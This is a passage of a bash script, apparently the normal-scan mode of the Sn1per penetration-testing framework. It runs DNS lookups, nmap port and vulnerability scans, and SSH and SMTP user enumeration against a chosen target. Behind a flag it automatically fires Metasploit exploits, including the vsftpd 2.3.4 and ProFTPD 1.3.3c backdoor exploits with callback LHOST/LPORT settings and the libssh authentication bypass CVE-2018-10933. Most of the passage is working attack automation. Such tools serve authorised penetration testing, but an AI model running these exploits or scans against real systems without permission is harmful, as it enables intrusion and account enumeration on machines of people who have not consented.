# NORMAL SCAN #####################################################################################################
if [[ "$REPORT" = "1" ]]; then
  args="-t $TARGET"
  if [[ "$OSINT" = "1" ]]; then
    args="$args -o"
  fi
  if [[ "$AUTO_BRUTE" = "1" ]]; then
    args="$args -b"
  fi
  if [[ "$FULLNMAPSCAN" = "1" ]]; then
    args="$args -fp"
  fi
  if [[ "$RECON" = "1" ]]; then
    args="$args -re"
  fi
  if [[ "$MODE" = "port" ]]; then
    args="$args -m port"
  fi
  if [[ ! -z "$PORT" ]]; then
    args="$args -p $PORT"
  fi
  if [[ ! -z "$WORKSPACE" ]]; then
    args="$args -w $WORKSPACE"
  fi
  args="$args --noreport"
  sniper $args | tee $LOOT_DIR/output/sniper-$TARGET-`date +"%Y%m%d%H%M"`.txt 2>&1
  exit
fi

echo -e "$OKRED                ____               $RESET"
echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
echo -e "$OKRED               /_/                 $RESET"
echo -e "$RESET"
echo -e "$OKORANGE + -- --=[https://sn1persecurity.com"
echo -e "$OKORANGE + -- --=[Sn1per v$VER by @xer0dayz"
echo -e "$RESET"

if [[ ! -z $WORKSPACE ]]; then
  LOOT_DIR=$WORKSPACE_DIR
fi

echo "$TARGET" >> $LOOT_DIR/domains/targets.txt
if [[ "$MODE" = "" ]]; then
  MODE="normal"
  echo "$TARGET $MODE `date +"%Y-%m-%d %H:%M"`" 2> /dev/null >> $LOOT_DIR/scans/tasks.txt 2> /dev/null
else
  echo "$TARGET $MODE `date +"%Y-%m-%d %H:%M"`" 2> /dev/null >> $LOOT_DIR/scans/tasks.txt 2> /dev/null
fi
echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/${TARGET}-${MODE}.txt 2> /dev/null
echo "sniper -t $TARGET -m $MODE --noreport $args" >> $LOOT_DIR/scans/running_${TARGET}_${MODE}.txt 2> /dev/null
ls -lh $LOOT_DIR/scans/running_*.txt 2> /dev/null | wc -l 2> /dev/null > $LOOT_DIR/scans/tasks-running.txt

echo "[sn1persecurity.com] •?((¯°·._.• Started Sn1per scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications_new.txt
if [[ "$SLACK_NOTIFICATIONS" == "1" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" "[sn1persecurity.com] •?((¯°·._.• Started Sn1per scan: $TARGET [${MODE}] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
fi

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED GATHERING DNS INFO $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
dig all +short $TARGET > $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
dig all +short -x $TARGET >> $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
host $TARGET 2> /dev/null | grep address 2> /dev/null | awk '{print $4}' 2> /dev/null >> $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null
mv -f *_ips.txt $LOOT_DIR/ips/ 2>/dev/null

echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED CHECKING FOR SUBDOMAIN HIJACKING $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
cat $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null | egrep -i "anima|bitly|wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine|cloudapp" | tee $LOOT_DIR/nmap/takeovers-$TARGET.txt 2>/dev/null

source $INSTALL_DIR/modes/osint.sh
source $INSTALL_DIR/modes/recon.sh

echo ""
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED PINGING HOST $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
ping -c 1 $TARGET
echo ""
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
mv -f $LOOT_DIR/nmap/ports-$TARGET.txt $LOOT_DIR/nmap/ports-$TARGET.old 2> /dev/null

if [[ "$MODE" == "web" ]]; then
  nmap -p 80,443  $NMAP_OPTIONS --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | sed -r "s/</\&lh\;/g" | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
elif [[ "$MODE" == "webscan" ]]; then 
  nmap -p 80,443 $NMAP_OPTIONS --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | sed -r "s/</\&lh\;/g" | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
elif [[ ! -z "$PORT" ]]; then 
  nmap -p $PORT $NMAP_OPTIONS --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | sed -r "s/</\&lh\;/g" | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
else
  nmap -p $DEFAULT_PORTS $NMAP_OPTIONS --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | sed -r "s/</\&lh\;/g" | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
fi

rm -f $LOOT_DIR/nmap/ports-$TARGET.txt 2> /dev/null
for PORT in `cat $LOOT_DIR/nmap/nmap-$TARGET.xml $LOOT_DIR/nmap/nmap-$TARGET-*.xml 2>/dev/null | egrep 'state="open"' | cut -d' ' -f3 | cut -d\" -f2 | sort -u | grep '[[:digit:]]'`; do
  echo "$PORT " >> $LOOT_DIR/nmap/ports-$TARGET.txt
done  

HOST_UP=$(cat $LOOT_DIR/nmap/nmap-$TARGET.txt $LOOT_DIR/nmap/nmap-$TARGET-*.txt 2> /dev/null | grep "host up" 2> /dev/null)
if [[ ${#HOST_UP} -ge 2 ]]; then
  echo "$TARGET" >> $LOOT_DIR/nmap/livehosts-unsorted.txt 2> /dev/null
fi
sort -u $LOOT_DIR/nmap/livehosts-unsorted.txt 2> /dev/null > $LOOT_DIR/nmap/livehosts-sorted.txt 2> /dev/null
diff $LOOT_DIR/nmap/ports-$TARGET.old $LOOT_DIR/nmap/ports-$TARGET.txt 2> /dev/null > $LOOT_DIR/nmap/ports-$TARGET.diff 2> /dev/null
cat $LOOT_DIR/nmap/nmap-$TARGET.txt $LOOT_DIR/nmap/nmap-$TARGET-*.txt 2>/dev/null | egrep "MAC Address:" | awk '{print $3 " " $4 " " $5 " " $6}' > $LOOT_DIR/nmap/macaddress-$TARGET.txt 2> /dev/null
cat $LOOT_DIR/nmap/nmap-$TARGET.txt $LOOT_DIR/nmap/nmap-$TARGET-*.txt $LOOT_DIR/output/nmap-$TARGET-*.txt 2>/dev/null | egrep "OS details:|OS guesses:" | cut -d\: -f2 | sed 's/,//g' | head -c50 - > $LOOT_DIR/nmap/osfingerprint-$TARGET.txt 2> /dev/null

if [[ "$SLACK_NOTIFICATIONS_NMAP" == "1" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" postfile "$LOOT_DIR/nmap/ports-$TARGET.txt"
fi

PORT_CHANGE=$(cat $LOOT_DIR/nmap/ports-$TARGET.diff 2> /dev/null)
if [[ ${#PORT_CHANGE} -ge 2 ]]; then
  echo "[sn1persecurity.com] •?((¯°·._.• Port change detected on $TARGET (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•" >> $LOOT_DIR/scans/notifications_new.txt
  cat $LOOT_DIR/nmap/ports-$TARGET.diff 2> /dev/null | egrep "<|>" >> $LOOT_DIR/scans/notifications_new.txt
fi

if [[ "$SLACK_NOTIFICATIONS_NMAP_DIFF" == "1" ]] && [[ -s "$LOOT_DIR/nmap/ports-$TARGET.diff" ]]; then
  /bin/bash "$INSTALL_DIR/bin/slack.sh" "[sn1persecurity.com] •?((¯°·._.• Port change detected on $TARGET (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
  /bin/bash "$INSTALL_DIR/bin/slack.sh" postfile "$LOOT_DIR/nmap/ports-$TARGET.diff"
fi

if [[ "$HTTP_PROBE" == "1" ]]; then
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo -e "$OKRED RUNNING HTTP PROBE $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
  echo "$TARGET" | fprobe -c 200 -p xlarge | tee $LOOT_DIR/web/httprobe-$TARGET.txt 2> /dev/null
  echo "$TARGET" | fprobe -c 200 -p xlarge -v | tee $LOOT_DIR/web/httprobe-$TARGET-verbose.txt 2> /dev/null
fi

echo ""
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
echo -e "$OKRED RUNNING INTRUSIVE SCANS $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
port_21=`grep 'portid="21"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_22=`grep 'portid="22"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_23=`grep 'portid="23"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_25=`grep 'portid="25"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_53=`grep 'portid="53"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_79=`grep 'portid="79"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_80=`grep 'portid="80"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_110=`grep 'portid="110"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_111=`grep 'portid="111"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_135=`grep 'portid="135"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_137=`grep 'portid="137"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_139=`grep 'portid="139"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_162=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_264=`grep 'portid="264"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_389=`grep 'portid="389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_512=`grep 'portid="512"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_513=`grep 'portid="513"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_514=`grep 'portid="514"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_623=`grep 'portid="623"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_624=`grep 'portid="624"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1099=`grep 'portid="1099"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_2181=`grep 'portid="2181"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_3632=`grep 'portid="3632"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_4443=`grep 'portid="4443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5555=`grep 'portid="5555"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5800=`grep 'portid="5800"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_5984=`grep 'portid="5984"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_7001=`grep 'portid="7001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8001=`grep 'portid="8001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_9200=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_9495=`grep 'portid="9495"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27018=`grep 'portid="27018"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_27019=`grep 'portid="27019"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_28017=`grep 'portid="28017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_49180=`grep 'portid="49180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`

port_67=`grep 'portid="67"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null | grep open | grep -v filtered`
port_68=`grep 'portid="68"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null | grep open | grep -v filtered`
port_69=`grep 'portid="69"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null | grep open | grep -v filtered`
port_123=`grep 'portid="123"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null  | grep open | grep -v filtered`
port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null | grep open | grep -v filtered`
port_500=`grep 'portid="500"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml 2> /dev/null | grep open | grep -v filtered`

if [[ -z "$port_21" ]];
then
  echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
else
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -sC -p 21 -v --script-timeout 90 --script=ftp-*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port21.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT FTP VERSION SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw > $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT ANONYMOUS FTP SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/anonymous; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw > $LOOT_DIR/output/msf-$TARGET-port21-anonymous.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use exploit/unix/ftp/vsftpd_234_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING PROFTPD 1.3.3C BACKDOOR EXPLOIT $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use unix/ftp/proftpd_133c_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw 2> /dev/null
  fi
fi

if [[ -z "$port_22" ]];
then
  echo -e "$OKRED + -- --=[Port 22 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 22 opened... running tests...$RESET"
  if [[ $DISTRO == "blackarch" ]]; then
    if [[ $SSH_AUDIT = "1" ]]; then
      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
      /bin/ssh-audit $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
    fi
  else
    if [[ $SSH_AUDIT = "1" ]]; then
      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
      echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
      cd $PLUGINS_DIR/ssh-audit
      python ssh-audit.py $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
    fi
  fi
  cd $INSTALL_DIR
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -sC -p 22 -v --script-timeout 90 --script=ssh-*,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port22.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SSH VERSION SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING OPENSSH USER ENUM SCANNER $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw 2> /dev/null
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING LIBSSH AUTH BYPASS EXPLOIT CVE-2018-10933 $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; use scanner/ssh/libssh_auth_bypass; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw 2> /dev/null
  fi
fi

if [[ -z "$port_23" ]];
then
  echo -e "$OKRED + -- --=[Port 23 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=telnet*,/usr/share/nmap/scripts/vulners -p 23 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port23.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT";  run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port23.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port23.raw > $LOOT_DIR/output/msf-$TARGET-port23.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port23.raw 2> /dev/null
  fi
fi

if [[ -z "$port_25" ]];
then
  echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    nmap -A -sV -Pn -v --script-timeout 90 --script=smtp*,/usr/share/nmap/scripts/vulners -p 25 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port25.txt
  fi
  if [[ "$METASPLOIT_EXPLOIT" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    echo -e "$OKRED RUNNING SMTP USER ENUM $RESET"
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
    msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw
    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw > $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.txt 2> /dev/null
    rm -f $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw 2> /dev/null
  fi
fi

if [[ -z "$port_53" ]];
then
  echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
  if [[ "$NMAP_SCRIPTS" = "1" ]]; then
    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
